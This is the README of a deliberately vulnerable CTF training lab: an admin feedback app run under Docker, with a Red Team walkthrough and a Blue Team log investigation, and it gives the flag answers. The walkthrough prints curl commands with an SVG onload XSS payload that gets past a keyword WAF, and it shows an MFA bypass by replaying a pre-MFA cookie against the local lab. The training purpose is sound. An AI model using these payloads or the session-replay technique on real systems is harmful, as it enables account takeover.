# Scenario75 Cyber Range - Davina Ritzky Amarina's Implementation

> **Isolated Training Environment — NOT for production use.**
> This is intentionally vulnerable training software for an authorized CTF/cyber-range exercise.
> Deploy and exploit only inside an isolated, air-gapped cyber-range environment with explicit written authorization.
> Never deploy on public networks, production systems, or without authorization.

This lab implements a fully functional **Cookies Reuse & MFA Bypass** CTF assessment scenario for cybersecurity engineer practical training. It is an isolated **Red Team vs Blue Team** exercise providing:

- A realistic vulnerable Admin Feedback System with live exploit paths
- Red Team objectives: reconnaissance, XSS, WAF bypass, cookie theft, MFA bypass, session replay
- Blue Team objectives: log analysis, anomaly detection, WAF review, timeline reconstruction
- Deterministic attack telemetry for Blue Team analysis
- Automated deployment and verification scripts

---

## 1. Scenario Overview

**Purpose:** Train cybersecurity engineers in attack and defense techniques using a controlled, reproducible, isolated CTF environment. No real systems are targeted.

**Red Team objective:** Exploit the intentionally vulnerable Admin Feedback System to bypass authentication, abuse session cookies, circumvent the rudimentary WAF, and recover the Red Team flag.

**Blue Team objective:** Investigate pre-generated deterministic attack telemetry, reconstruct the attack timeline, identify the attacker, decode the embedded clue, and recover the Blue Team flag.

**Intentionally vulnerable behaviors:**
- `robots.txt` exposes sensitive endpoint paths
- `X-Powered-By` header leaks technology information
- The WAF blocks only literal `<script>` patterns — SVG-based payloads bypass it
- The MFA flow issues a `pre_mfa_session` cookie that can be replayed
- The `adm_sess` administrative session grants full dashboard access
- The dashboard reflects an XSS payload marker

**Architecture:** Single Linux VM running Docker Compose. All services are isolated on a Docker bridge network.

**Target hostname:** `feedback.admin.local`
**HTTP port:** `3075`
**SSH port:** `2275`

This environment is intended exclusively for an isolated, authorized lab. Do not connect it to the internet or deploy it on shared infrastructure.

---

## 2. Architecture

```
Host (Linux environment)
  |
  +-- 127.0.0.1:3075
          |
        Nginx
          |
      Docker network (cyberrange bridge)
          |
       Node.js app
          |
        :3075
```

- **Node.js** listens on the container interface (`:3075`) so Nginx can reach it via the Docker bridge network using the service name `app`. It is **not** directly published to the host.
- **Nginx** is the **only published HTTP endpoint** during local setup, bound to `127.0.0.1:3075` on the host.
- The current verifier confirms that no service uses host networking (`network_mode: host`).
- Do not publish the Node.js app port directly to the host — that would bypass the Nginx reverse proxy and break the intended architecture.

---

## 3. Prerequisites

Required things on the Linux VM or local development machine:

- Linux (the lab VM target; scripts enforce this for SSH setup)
- Docker
- Docker Compose (v2 plugin or standalone)
- Git
- Bash
- `curl`
- Standard command-line utilities (`grep`, `base64`, `ss`, `getent`)

> **Not required:** Any external infrastructure such as a database or tools such as Wazuh, etc. The lab is fully self-contained.

---

## 4. Start the Lab

```bash
cd ~/projects/scenario76-davina
docker compose up -d --build
docker compose ps
```

Check that both `app` and `nginx` services show as `running` (or `healthy`).

Health check:

```bash
curl -i http://127.0.0.1:3075/health
```

Expected successful state: HTTP `200 OK` with a JSON health response. If the health check fails, wait ~10 seconds for the Node.js container to finish its startup health check, then retry.

---

## 5. Automated Verification

```bash
bash scripts/verify_lab.sh
```

Expected result:

```
PASSED: 14/14
FAILED: 0/14
All checks passed.
```

The verifier covers:

| Check | What it tests |
|-------|---------------|
| 1 | Dashboard authentication protection — unauthenticated request returns 401/403 |
| 2 | `robots.txt` reconnaissance paths and recon flag present |
| 3 | `X-Powered-By: SCENARIO75{Node.js}` header |
| 4 | Login with `admin`/`admin123` returns 200 and sets `pre_mfa_session` cookie |
| 5 | MFA endpoint returns 200 and sets `adm_sess` cookie |
| 6 | Authenticated dashboard returns 200 |
| 7 | Dashboard contains `.xss-payload` class marker |
| 8 | WAF blocks `<script>` payload with HTTP 403 |
| 9 | SVG payload bypasses WAF and returns HTTP 200 |
| 10 | App port not directly published to host |
| 11 | No service uses host networking |
| 12 | `generate_logs.sh` produces required deterministic log files and events |
| 13 | Feedback endpoint accepts a valid message (200) |
| 14 | Health endpoint returns 200 |

Do not modify `scripts/verify_lab.sh`.

---

## 6. Red Team Investigation

All steps below are authorized lab exercises against the local isolated environment only.

### 6.1 Reconnaissance

```bash
curl -i http://127.0.0.1:3075/
curl -i http://127.0.0.1:3075/robots.txt
```

The root response includes the header:

```
X-Powered-By: SCENARIO75{Node.js}
```

The `robots.txt` response reveals sensitive endpoint paths:

```
Disallow: /api/verify-mfa
Disallow: /dashboard
```

It also contains the intended reconnaissance clue/flag: `SCENARIO75{R3c0n_F1ag_R0b0ts_D1sc0v3r3d}`

These are intentional reconnaissance clues built into the lab scenario.

### 6.2 Authentication / Pre-MFA Session

Use the intentionally provided CTF lab credential (`admin`/`admin123`) — this is not a real credential:

```bash
curl -i \
  -c /tmp/scenario75-cookies.txt \
  -H 'Content-Type: application/json' \
  -d '{"username":"admin","password":"admin123"}' \
  http://127.0.0.1:3075/api/login
```

Inspect the cookie jar:

```bash
cat /tmp/scenario75-cookies.txt
```

The `pre_mfa_session` cookie represents a partially-authenticated state — the user has provided credentials but has not yet completed MFA. This cookie is intentionally designed to be abusable in the CTF scenario to demonstrate session management weaknesses.

### 6.3 WAF Test

Test the rudimentary WAF with a conventional `<script>` payload:

```bash
curl -i \
  -X POST \
  -H 'Content-Type: application/json' \
  -d '{"message":"<script>alert(1)</script>"}' \
  http://127.0.0.1:3075/api/feedback
```

Expected: **HTTP 403**

The WAF blocks this request because it matches the literal `<script>` pattern. This demonstrates that a simple pattern-matching WAF is in place.

### 6.4 WAF Bypass Test

Test the SVG-based bypass:

```bash
curl -i \
  -X POST \
  -H 'Content-Type: application/json' \
  -d '{"message":"<svg onload=\"alert(1)\">"}' \
  http://127.0.0.1:3075/api/feedback
```

Expected: **HTTP 200**

The WAF does not block this payload because it only pattern-matches `<script>`. An SVG element with an inline event handler is equally capable of executing JavaScript in a browser context. This demonstrates that keyword-based blocking is insufficient — robust HTML sanitization is required.

### 6.5 MFA / Administrative Session

Using the `pre_mfa_session` cookie, submit the MFA code:

```bash
curl -i \
  -b /tmp/scenario75-cookies.txt \
  -c /tmp/scenario75-cookies.txt \
  -X POST \
  -H 'Content-Type: application/json' \
  -d '{"code":"123456"}' \
  http://127.0.0.1:3075/api/verify-mfa
```

Inspect the updated cookie jar:

```bash
cat /tmp/scenario75-cookies.txt
```

The `adm_sess` cookie represents a fully authenticated administrative session. This cookie grants access to the protected dashboard. The CTF scenario demonstrates how this session can be obtained by replaying a `pre_mfa_session` — an MFA bypass through insufficient server-side session state enforcement.

### 6.6 Authenticated Dashboard

Request the dashboard with the administrative session cookie:

```bash
curl -i \
  -b /tmp/scenario75-cookies.txt \
  http://127.0.0.1:3075/dashboard
```

Locate the XSS payload marker:

```bash
curl -s \
  -b /tmp/scenario75-cookies.txt \
  http://127.0.0.1:3075/dashboard | grep -n "xss-payload"
```

The authenticated dashboard is only accessible with a valid `adm_sess` cookie and contains a `.xss-payload` class marker. This reflects the stored XSS payload demonstrating that user-supplied input (from the feedback endpoint) is rendered in an administrative context without proper output encoding — a high-impact finding.

### 6.7 Red Team Findings

**Attack chain:**

```
Recon
→ exposed sensitive paths (robots.txt)
→ pre-MFA session (admin/admin123 login)
→ rudimentary WAF (<script> blocked)
→ SVG bypass (<svg onload=...> accepted)
→ cookie/session abuse (pre_mfa_session reuse)
→ administrative session reuse (adm_sess)
→ authenticated dashboard
→ authentication/MFA bypass
```

**Red Team flag:**

```
SCENARIO75{RED_C00k13_MFA_Byp4ss_0wn3d}
```

---

## 7. Blue Team Investigation

This phase uses deterministic lab telemetry. Generate the logs first:

```bash
bash scripts/generate_logs.sh
```

The script prints the actual log directory it selected, for example:

```
[*] Writing simulated attack telemetry to /opt/admin/logs
```

or, in a non-root development environment where `/opt/admin/logs/` is not writable:

```
[*] Writing simulated attack telemetry to .../logs
```

**The log location is determined by `generate_logs.sh` at runtime.** The script attempts to use `/opt/admin/logs/` if it can create and write there; otherwise it falls back to the repository's `logs/` directory. Do not manually create `/opt/admin/logs/` — the script handles this automatically. The verifier (`scripts/verify_lab.sh`) supports both locations.

For a non-root development environment, confirm the files exist at the fallback location:

```bash
ls -lah logs/
```

The two important log files (shown here using the repository fallback paths):

| File | Contents |
|------|----------|
| `logs/access.log` | Full HTTP access timeline including attacker activity and the embedded Blue Team flag |
| `logs/error.log` | WAF events, cookie reuse indicators, authentication bypass anomalies |

> If `generate_logs.sh` selected `/opt/admin/logs/`, substitute that path in the commands below.

### 7.1 Identify the Attacker

```bash
grep '10.10.14.50' logs/access.log
```

Key findings:

- **Attacker IP:** `10.10.14.50`
- **Attacker network:** `10.10.14.0/24`
- **User-Agent:** `Mozilla/5.0`
- Legitimate traffic originates from `192.168.1.100` — correlating the source IP narrows the investigation to the suspicious client.

### 7.2 Identify Initial WAF Activity

```bash
grep '18:50:15' logs/error.log
```

This timestamp identifies the first WAF `<script>` block event — the attacker's initial probe and the starting point of the attack timeline.

### 7.3 Identify Successful Dashboard Access

```bash
grep '18:51:55' logs/access.log
```

The `/dashboard` endpoint returned HTTP `200` at exactly `18:51:55`. This is the moment the attacker achieved authenticated access — a critical event in the timeline.

### 7.4 Investigate Cookie Reuse

```bash
grep -i 'CRITICAL' logs/error.log
grep -i 'cookie' logs/error.log
```

Cookie reuse indicators should be correlated with the suspicious client IP (`10.10.14.50`) and administrative session activity to build evidence of session hijacking/replay.

### 7.5 Identify Authentication Bypass

```bash
grep '18:53:10' logs/error.log
```

Expected finding: an **authentication bypass anomaly** logged at `18:53:10`. This is the log evidence of the MFA bypass step in the attack chain.

### 7.6 Analyze the Encoded X-Forwarded-For Value

```bash
grep 'X-Forwarded-For' logs/access.log
```

The log contains the following value:

```
UEhBTlRPTUdSSUR7QkxVRV9MMGdfSHVudDNyX000c3Qzcn0=
```

The length and character set (alphanumeric plus `+`, `/`, `=` padding) make Base64 a reasonable encoding hypothesis. Decode it:

```bash
echo 'UEhBTlRPTUdSSUR7QkxVRV9MMGdfSHVudDNyX000c3Qzcn0=' | base64 -d
```

Expected output:

```
SCENARIO75{BLUE_L0G_HUnt3r_M4st3r}
```

---

## 8. Blue Team Timeline

```
18:50:15  Suspicious <script> payload blocked by WAF
   ↓
          Attacker changes technique
   ↓
18:51:55  /dashboard → HTTP 200  (authenticated access achieved)
   ↓
          Cookie/session reuse indicators in error.log
   ↓
18:53:10  Authentication bypass anomaly logged
   ↓
          X-Forwarded-For encoded clue identified in access.log
   ↓
          Base64 decoding
   ↓
          Blue Team flag: SCENARIO75{BLUE_L0G_HUnt3r_M4st3r}
```

---

## 9. Final Infrastructure Validation

```bash
docker compose ps
docker compose port app 3075
docker compose port nginx 80
docker compose config
```

Expected state:

- `docker compose port app 3075` — should return **empty** (app has no host port mapping)
- `docker compose port nginx 80` — should return `127.0.0.1:3075` (Nginx published on expected port)
- `docker compose config` — should contain no `network_mode: host` entry

Also confirm the health endpoint:

```bash
curl -i http://127.0.0.1:3075/health
```

Expected: HTTP `200 OK`.

---

## 10. Hostname Validation

To exercise the lab using the intended hostname, add the following entry to `/etc/hosts` on the lab VM:

```
127.0.0.1 feedback.admin.local
```

Then validate:

```bash
getent hosts feedback.admin.local
curl -i http://feedback.admin.local:3075/
```

This is local lab hostname resolution only — it does not require public DNS and has no external network effect. The entry must be added manually; it is not configured automatically by the lab setup.

---

## 11. SSH Validation

SSH access for Blue Team analysts is configured by `scripts/setup_ssh.sh`, which targets the **isolated Proxmox lab VM only**. The script requires the `ANALYST_PASSWORD` environment variable — the credential is never hardcoded.

To run on the lab VM:

```bash
ANALYST_PASSWORD="<secure-random-password>" bash scripts/setup_ssh.sh
```

The script:
- Creates the `analyst` user
- Configures `sshd` on port `2275`
- Refuses to run outside the isolated VM (checks for `/etc/cyberrange-isolated`)

Validate SSH is listening (on the lab VM):

```bash
sudo ss -lntp | grep 2275
```

Connect:

```bash
ssh -p 2275 analyst@127.0.0.1
```

> **Note:** Do not hardcode the analyst password in this README or commit it to the repository. Always pass it via the environment variable as shown above.

---

## 12. Repository / Secret Validation

```bash
git status
git status --ignored
git ls-files | grep -E '(^|/)(\.env|.*\.key|.*\.pem|id_rsa|id_ed25519)'
```

The following must **not** be committed to the repository:

- Secret values, private keys, `.env` files with real credentials
- `node_modules/` directories
- VM disk images or snapshots
- Generated log files (`logs/*.log`, or `/opt/admin/logs/` if used)
- Any other generated artifacts

The `.gitignore` enforces most of these exclusions. Verify that `git status --ignored` shows no sensitive files escaping the ignore rules.

---

## 13. Complete Assessment Checklist

### Automated

- [ ] `bash scripts/verify_lab.sh`
- [ ] 14/14 checks pass
- [ ] Docker services healthy

### Red Team

- [ ] Recon completed
- [ ] `robots.txt` analyzed
- [ ] Pre-MFA session identified
- [ ] `<script>` blocked (HTTP 403)
- [ ] SVG bypass demonstrated (HTTP 200)
- [ ] Administrative session behavior demonstrated
- [ ] Dashboard accessed
- [ ] Red Team flag recovered: `SCENARIO75{RED_C00k13_MFA_Byp4ss_0wn3d}`

### Blue Team

- [ ] Logs generated (`bash scripts/generate_logs.sh` — prints the selected log directory)
- [ ] Attacker IP identified (`10.10.14.50`)
- [ ] User-Agent identified (`Mozilla/5.0`)
- [ ] WAF event identified at `18:50:15`
- [ ] Dashboard HTTP 200 identified at `18:51:55`
- [ ] Cookie reuse identified in `error.log`
- [ ] Authentication bypass identified at `18:53:10`
- [ ] X-Forwarded-For clue identified
- [ ] Base64 decoded
- [ ] Blue Team flag recovered: `SCENARIO75{BLUE_L0G_HUnt3r_M4st3r}`

### Infrastructure

- [ ] App not directly published to host
- [ ] Nginx published on `127.0.0.1:3075`
- [ ] No host networking
- [ ] `/health` returns HTTP 200
- [ ] `feedback.admin.local` resolves locally (if required for the assessment)
- [ ] SSH on port `2275` configured (if required for the assessment)
- [ ] No secrets committed to the repository

---

## 14. Presentation Flow

Suggested 15–20 minute flow:

| Time | Topic |
|------|-------|
| 1–2 min | Scenario overview and architecture — isolated CTF context, Red vs Blue objectives |
| 3–5 min | Red Team reconnaissance and attack chain — `robots.txt`, `X-Powered-By`, login, pre-MFA session |
| 3–4 min | WAF behavior and bypass — `<script>` blocked, SVG payload accepted, why keyword WAF fails |
| 1–2 min | Administrative session and dashboard impact — `adm_sess` reuse, reflected XSS payload marker |
| 4–5 min | Blue Team log investigation — attacker IP, WAF event, dashboard 200, cookie reuse, auth bypass |
| 1–2 min | Base64 analysis and Blue Team flag |
| 1–2 min | Mitigation summary and final infrastructure validation |

Focus the presentation on:

- **Evidence** — show actual log lines, HTTP responses, cookie values
- **Timeline** — anchor every finding to a timestamp
- **Attack chain** — connect each step to the next
- **Detection** — what Blue Team signals correlate with each Red Team action
- **Impact** — what an attacker achieves at each stage
- **Mitigation** — what control would have broken the chain

---

## 15. Mitigation / Lessons Learned

The following defensive improvements address the intentional vulnerabilities in this lab. The current vulnerable behavior is **not** production-safe.

| Vulnerability | Mitigation |
|---------------|------------|
| XSS via unencoded output | Use proper context-aware output encoding; never insert untrusted data directly into HTML |
| Keyword-based WAF | Replace pattern-matching rules with robust HTML sanitization (e.g. DOMPurify or equivalent server-side library) |
| Session cookie exposure | Set `HttpOnly`, `Secure`, and appropriate `SameSite` flags on all session cookies |
| MFA bypass via cookie replay | Enforce MFA server-side; invalidate `pre_mfa_session` after successful or failed MFA; bind administrative sessions to verified MFA state |
| `pre_mfa_session` reuse | Tie session tokens to client fingerprint and enforce single-use or short TTL |
| Cookie/session anomalies | Detect anomalous reuse of session tokens from different IPs or User-Agents; alert on replayed cookies |
| Log correlation gaps | Correlate WAF, authentication, and application logs into a unified timeline for faster detection |
| `robots.txt` information disclosure | Avoid listing sensitive paths in `robots.txt`; it does not restrict access and serves as a reconnaissance aid |
| Least privilege | Limit what each service and session can access; administrative sessions should have the shortest viable lifetime |
| Telemetry for incident investigation | Maintain deterministic, structured telemetry in the lab to support reproducible Blue Team exercises |

---

## 16. Cleanup

Stop the lab:

```bash
docker compose down
```

This stops and removes containers and the Docker bridge network. No named volumes are defined in this project, so no volume cleanup is required.

---

## Directory Structure

```
scenario76-davina/
├── app/              Node.js Express application
│   ├── src/          Application source
│   └── test/         Test suite
├── nginx/            Nginx reverse proxy config
├── scripts/          generate_logs.sh, verify_lab.sh, setup_ssh.sh, deploy.sh
├── logs/             Log output fallback (used when /opt/admin/logs/ is not writable)
├── docs/             architecture.md, red-team.md, blue-team.md, deployment.md
└── docker-compose.yml
```

---

## Proxmox Deployment

This section documents how to deploy the existing Scenario75 Cyber Range as a single Linux VM on Proxmox VE.

> **Important distinction:**
> - **Local development/testing** — performed inside your Ubuntu VMware VM as described in sections 1–16 above.
> - **Final lab deployment** — the same repository is cloned into a fresh Linux VM created on a Proxmox VE host. The Proxmox host itself does not run the application directly.

The repository does not create or configure a Proxmox VM automatically. Proxmox VM provisioning is a manual infrastructure step performed before cloning the repository.

### Intended Architecture

```text
Proxmox VE Host
       |
       +-- Scenario75 Linux VM
               |
               +-- Docker Compose
                       |
                       +-- Nginx
                       |
                       +-- Node.js application
```

The application runs entirely inside the Linux VM. Docker Compose manages Nginx and the Node.js application as containers on an isolated Docker bridge network. The Proxmox host and the broader network are not involved in the application's internal operation.

---

### Proxmox VM Requirements

These are deployment recommendations. Adjust them according to your actual Proxmox environment — no unsupported hard requirements are imposed by the repository itself.

| Resource | Recommendation |
|----------|---------------|
| VM type | Linux 64-bit |
| vCPU | 2 cores |
| RAM | 4 GB minimum; 6 GB recommended if available |
| Disk | At least 20 GB free for the OS, lab files, and Docker images |
| Network | One virtual NIC |
| OS | Ubuntu Server 22.04 LTS or another supported 64-bit Linux distribution |
| Storage | Local VM disk |
| Boot | Standard BIOS or UEFI — both are supported by mainstream Linux images |

Allocate resources appropriate to your Proxmox environment. These figures are a practical starting point, not fixed requirements.

---

### Create the Proxmox VM

The following is a high-level process. Substitute the node names, storage pool names, bridge names, IP addresses, and network ranges appropriate to your own Proxmox environment — none of these are dictated by this repository.

1. Log in to the Proxmox VE web interface.
2. Upload or otherwise make available the Linux installation ISO (for example, Ubuntu Server 22.04 LTS).
3. Create a new VM.
4. Select the Linux ISO as the installation media.
5. Allocate the recommended CPU cores, memory, and disk size.
6. Add one virtual network interface connected to your chosen bridge.
7. Install the Linux operating system using the standard guided installer.
8. Boot the VM and complete initial OS setup.
9. Log in to the Linux VM.

---

### Prepare the Proxmox Linux VM

Update the system packages:

```bash
sudo apt update
sudo apt upgrade -y
```

Install Docker and Docker Compose using the supported installation method for your chosen Linux distribution. Refer to the official Docker documentation for your OS — do not assume a specific package version unless the repository explicitly requires one.

After installation, verify the tools are available:

```bash
docker --version
docker compose version
git --version
```

---

### Obtain the Repository

Clone the repository into the VM:

```bash
git clone https://github.com/Daaaaaav/scenario76-davina.git
cd scenario76-davina
```

---

### Start the Lab on Proxmox

Build and start all services:

```bash
docker compose up -d --build
```

Confirm both services are running:

```bash
docker compose ps
```

Expected state:

- `app` is healthy.
- `nginx` is running.
- The Node.js application port is **not** directly published to the host — Nginx is the only HTTP entry point.

Verify the port configuration:

```bash
docker compose port app 3075
docker compose port nginx 80
```

The exact output depends on the current compose configuration. The intended design is that `docker compose port app 3075` returns empty (no host port mapping for the app), and `docker compose port nginx 80` returns the Nginx host binding. The application is not independently exposed through a host port.

---

### Verify the Application

Test the application directly through the Docker network:

```bash
curl -i http://127.0.0.1:3075/
```

Test the health endpoint:

```bash
curl -i http://127.0.0.1:3075/health
```

Expected: HTTP `200` for both the application root and the health endpoint.

Run the full verification suite:

```bash
bash scripts/verify_lab.sh
```

Expected result:

```
PASSED: 14/14
FAILED: 0/14
All checks passed.
```

The verification script is the primary functional validation after deployment. The same 14/14 result that applies in the local VMware development environment is the acceptance gate on Proxmox. Run `verify_lab.sh` before proceeding to the Red Team or Blue Team investigation.

---

### Configure feedback.admin.local

The lab uses the hostname `feedback.admin.local` as the intended target address. For a closed lab environment, add a local hostname resolution entry in the VM's `/etc/hosts` file:

```
<LAB_VM_IP> feedback.admin.local
```

Replace `<LAB_VM_IP>` with the actual IP address assigned to your Proxmox VM. Do not invent an address — use the one assigned by your Proxmox network configuration.

Verify the hostname resolves:

```bash
getent hosts feedback.admin.local
```

Test through the hostname:

```bash
curl -i http://feedback.admin.local:3075/
```

> **Important:** Do not create a public DNS record for this hostname. Do not expose the lab to the public Internet. The hostname should resolve only within the isolated lab environment unless the assessment explicitly requires otherwise.

---

### Proxmox Network Isolation

This is an intentionally vulnerable CTF application. The following network controls are strongly recommended:

- Place the VM on an isolated lab network or VLAN when possible.
- Do not expose the VM or its services to the public Internet.
- Do not port-forward the vulnerable application from the Internet.
- Restrict access to the authorized assessment network only.
- Use Proxmox firewall and network controls where appropriate for your environment.
- Do not expose the application directly to an untrusted network unless the assessment specifically requires controlled network access.

The exact firewall rules and network settings depend on your Proxmox infrastructure and are not prescribed by this repository.

---

### SSH Configuration

The assessment environment includes SSH access:

- **SSH port:** `2275`
- **User:** `analyst`

SSH configuration is performed by the repository's existing setup mechanism (`scripts/setup_ssh.sh`) on the deployed VM. Refer to section 11 of this README for the setup procedure.

Before relying on SSH, validate that the port is listening on the VM:

```bash
sudo ss -lntp | grep 2275
```

Connect from the assessment network:

```bash
ssh -p 2275 analyst@<LAB_VM_IP>
```

Replace `<LAB_VM_IP>` with the actual IP address of the Proxmox VM.

> The analyst password is never stored in this README. Do not commit credentials to the repository. Always pass the password via the `ANALYST_PASSWORD` environment variable as shown in section 11.

The VM's firewall and Proxmox network policy should restrict SSH access to the authorized assessment network only.

---

### Blue Team Logs on Proxmox

Generate the deterministic attack telemetry:

```bash
bash scripts/generate_logs.sh
```

The script first attempts to write logs to `/opt/admin/logs/`. If that location is not writable (for example, on a non-root account or a VM where `/opt/admin/` does not exist), it falls back to the repository's `logs/` directory. The script prints the path it selected — use that path for all subsequent log commands.

> Do not assume `/opt/admin/logs/` always exists. Use the path printed by the script.

For the repository fallback location, confirm the log files exist:

```bash
ls -lah logs/
```

Inspect the logs (using the repository fallback paths; substitute `/opt/admin/logs/` if the script selected that location):

```bash
cat logs/access.log
cat logs/error.log
```

Example investigation queries:

```bash
grep '10.10.14.50' logs/access.log
grep '18:50:15' logs/error.log
grep '18:51:55' logs/access.log
grep '18:53:10' logs/error.log
grep -i 'CRITICAL' logs/error.log
grep -i 'cookie' logs/error.log
```

These log entries are deterministic simulated CTF telemetry events — they are the same on Proxmox as in the local VMware development environment.

---

### Proxmox Deployment Validation Checklist

- [ ] Linux VM created on Proxmox
- [ ] VM has sufficient CPU/RAM/disk
- [ ] Docker installed
- [ ] Docker Compose available
- [ ] Repository cloned
- [ ] `docker compose up -d --build` succeeds
- [ ] `app` container healthy
- [ ] `nginx` container running
- [ ] App port is not directly published to host
- [ ] HTTP endpoint responds
- [ ] `/health` returns 200
- [ ] `verify_lab.sh` reports 14/14
- [ ] `feedback.admin.local` resolves correctly if required
- [ ] SSH port 2275 configured if required
- [ ] `analyst` account validated
- [ ] Blue Team logs generated
- [ ] Red Team walkthrough validated
- [ ] Blue Team walkthrough validated
- [ ] VM is isolated from the public Internet
- [ ] No secrets committed to the repository

---

### Proxmox Final Assessment Workflow

```
Proxmox VM
   ↓
Install Linux
   ↓
Install Docker / Docker Compose
   ↓
Clone repository
   ↓
docker compose up -d --build
   ↓
verify_lab.sh
   ↓
14/14 checks
   ↓
Red Team investigation
   ↓
Blue Team investigation
   ↓
Evidence / flags
   ↓
Final presentation
```

---

### Troubleshooting

**Containers do not start**

```bash
docker compose ps
docker compose logs --tail=100
```

**Application is unhealthy**

```bash
docker compose logs app
curl -i http://127.0.0.1:3075/health
```

Wait approximately 10 seconds for the Node.js container to complete its startup health check, then retry.

**Nginx cannot reach the application**

```bash
docker compose ps
docker compose logs nginx
docker compose logs app
```

Confirm both containers are running and on the same Docker network. Do not publish the Node.js application port directly to the host as a workaround — that bypasses Nginx and breaks the intended architecture.

**Hostname does not resolve**

```bash
getent hosts feedback.admin.local
```

Check the `/etc/hosts` entry on the VM and confirm you used the actual IP address assigned to the VM, not a placeholder.

**Logs are not under `/opt/admin/logs/`**

This is expected when `generate_logs.sh` cannot write to that path. The script automatically falls back to the repository's `logs/` directory and prints the selected path. Use the path the script printed — do not manually create `/opt/admin/logs/`.

---

### Important Proxmox Safety Note

> This application is intentionally designed as a vulnerable cybersecurity training environment. It must be deployed only inside an authorized and appropriately isolated assessment/lab network. Do not expose the vulnerable application or its intentionally weak authentication/session behavior to the public Internet.

Do not add instructions for public hosting, Internet port forwarding, or deployment to an uncontrolled network. This repository does not support and does not document any such deployment.
